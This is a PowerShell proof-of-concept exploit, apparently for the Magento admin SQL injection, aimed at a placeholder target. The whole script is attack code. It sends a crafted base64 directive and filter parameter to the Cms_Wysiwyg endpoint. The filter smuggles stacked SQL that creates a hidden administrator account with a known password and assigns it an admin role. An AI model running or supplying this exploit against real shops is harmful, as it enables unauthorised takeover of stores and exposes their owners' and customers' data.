$target = "http://vulnerablemagento.com"



$target_url = $target + "/admin/Cms_Wysiwyg/directive/index/"

$q = "SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , 'forme') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO admin_user (firstname, lastname,email,username,password,created,lognum,reload_acl_flag,is_active,extra,rp_token,rp_token_created_at) VALUES ('Firstname','Lastname','email@example.com','forme',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO admin_role (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = 'forme'),'Firstname');"

$pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);" + $q

$body = @{
    '___directive' = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ";
    'filter' = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pfilter));
    'forwarded' = 1;
}

$req = Invoke-WebRequest -Method 'Post' -Uri $target_url -Body $body

$req.StatusDescription
